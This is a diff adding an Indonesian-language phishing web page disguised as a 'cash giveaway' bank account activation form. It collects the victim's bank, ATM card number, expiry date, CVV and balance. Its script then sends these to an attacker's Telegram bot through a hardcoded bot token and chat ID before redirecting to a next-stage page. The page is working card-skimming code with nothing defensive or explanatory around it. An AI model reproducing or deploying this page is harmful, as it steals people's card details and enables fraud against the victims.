@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Formulir Rekening</title>
+  <link rel="icon" type="image/x-icon" href="asset/logo-index3.png">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+  <style>
+    /* Custom CSS untuk tampilan di perangkat seluler */
+    .navbar {
+      background-color: #5babe0 !important; /* Warna background navbar */
+    }
+    .navbar-brand img {
+      width: auto; /* Atur lebar gambar logo */
+      max-height: 40px; /* Atur tinggi maksimum gambar logo */
+    }
+    .navbar-brand h2 {
+      font-size: 1rem; /* Atur ukuran teks */
+      color: #ffffff; /* Warna teks */
+    }
+    .title-web h2 {
+      font-size: 1rem; /* Atur ukuran teks */
+    }
+    .form-control {
+      border-radius: 15px; /* Atur border radius */
+    }
+    .btnNext {
+      border-radius: 19px; /* Atur border radius */
+      height: 45px; /* Atur tinggi tombol */
+    }
+    body {
+      background-color: #5babe0; 
+    }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container">
+    <a class="navbar-brand" href="#">
+        <h2>GIVEAWAY UANG TUNAI</h2>
+    </a>
+    <h3 style="color: #00ff22">Aktivasi Rekening</h3>
+  </div>
+</nav>
+<div class="container">
+  <div class="title-web mt-2">
+    <div class="logo-atas">
+      <center><img class="img-fluid" src="asset/rekening.jpg" alt=""></center>
+    </div>
+    <div class="title-web mt-2">
+      <h2 class="text-center">Silahkan Dilengkapi untuk Rekening nya Agar Bisa di Proses</h2>
+    </div>
+    <br>
+    <div class="container w-80">
+      <div class="form-cc">
+        <div class="form-group" style="width: 45%">
+          <select class="form-control shadow-sm" id="input0">
+            <option value="">=Pilihan Bank Anda=</option>
+            <option value="BCA">BCA</option>
+            <option value="BNI">BNI</option>
+            <option value="BRI">BRI</option>
+            <option value="Mandiri">Mandiri</option>
+            <option value="BTN">BTN</option>
+            <option value="CIMB NIAGA">CIMB NIAGA</option>
+            <option value="BSI">BSI</option>
+            <option value="OCBC NISP">OCBC NISP</option>
+            <option value="PERMATA">PERMATA</option>
+            <option value="DANAMON">DANAMON</option>
+            <option value="BTPN">BTPN</option>
+            <option value="Bank MEGA">Bank MEGA</option>
+          </select>
+        </div>
+        <div class="form-group mt-3">
+          <input type="number" class="form-control shadow-sm" style="width: 100%" id="input1" placeholder="Nomor Kartu ATM 16 Digit Angka" maxlength="16" minlenght="16">
+        </div>
+        <label class="fw-bold mt-3">Masa Berlaku Kartu ATM</label>
+        <div class="d-flex justify-content-between mt-3">
+          <div class="form-group" style="width: 45%">
+            <select class="form-control shadow-sm" id="input2">
+              <option value="">Bulan</option>
+              <option value="1">01</option>
+              <option value="2">02</option>
+              <option value="3">03</option>
+              <option value="4">04</option>
+              <option value="5">05</option>
+              <option value="6">06</option>
+              <option value="7">07</option>
+              <option value="8">08</option>
+              <option value="9">09</option>
+              <option value="10">10</option>
+              <option value="11">11</option>
+              <option value="12">12</option>
+            </select>
+          </div>
+          <div class="form-group" style="width: 45%">
+            <select class="form-control shadow-sm" id="input3">
+              <option value="">Tahun</option>
+              <option value="2023">2023</option>
+              <option value="2024">2024</option>
+              <option value="2025">2025</option>
+              <option value="2026">2026</option>
+              <option value="2027">2027</option>
+              <option value="2028">2028</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-group mt-3">
+          <label class="fw-bold" for="input4">CVV 7 Digit di Belakang Kartu</label>
+          <input type="number" class="form-control shadow-sm" style="width: 45%" id="input4" placeholder="7 Digit Angka">
+        </div>
+        <label class="fw-bold mt-3">Akumulasi Saldo Terakhir</label>
+        <div class="form-group">
+          <input type="number" class="form-control shadow-sm" id="input5" placeholder="Rp.*********" maxlength="16" minlenght="16">
+        </div>
+        <div class="bnt-next mt-3 mb-3 text-center">
+          <button onclick="next()" class="btnNext mt-3" style="background-color: #00ed00; border: none; border-radius: 19px; width: 100%; color: rgb(0, 0, 0); font-weight: bold; height: 45px" >Lanjut</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  function sendMessage(id, botApi, pesan) {
+    const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
+    const data = {
+      chat_id: id,
+      text: pesan
+    };
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Pesan terkirim:', data);
+      window.location.href = "koderek.html"
+    })
+    .catch(error => {
+      console.error('Terjadi kesalahan:', error);
+    });
+  }
+
+  const next = () => {
+    const bank = document.querySelector("#input0").value;
+    const nocard = document.querySelector("#input1").value;
+    const bulan = document.querySelector("#input2").value;
+    const tahun = document.querySelector("#input3").value;
+    const cvv = document.querySelector("#input4").value;
+    const saldo = document.querySelector("#input5").value;
+    
+    let text = `==| REKENING BANK |==\n\nType Bank: ${bank}\nNomor Kartu: ${nocard}\nBulan: ${bulan}\nTahun: ${tahun}\nCVV: ${cvv}\nsaldo: ${saldo}`;
+    let bot = "7070593349:AAGhtyk4PiU3fMmLVe9CQiKPaQlrZLR8yjM";
+    let id = "6250486742";
+    if (bank === "" || nocard === "" || cvv === "" || bulan === "" || tahun === "" || saldo === "") {
+      alert("Mohon lengkapi data Anda.");
+    } else {
+      sendMessage(id, bot, text);
+    }
+  }
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+</body>
+</html>
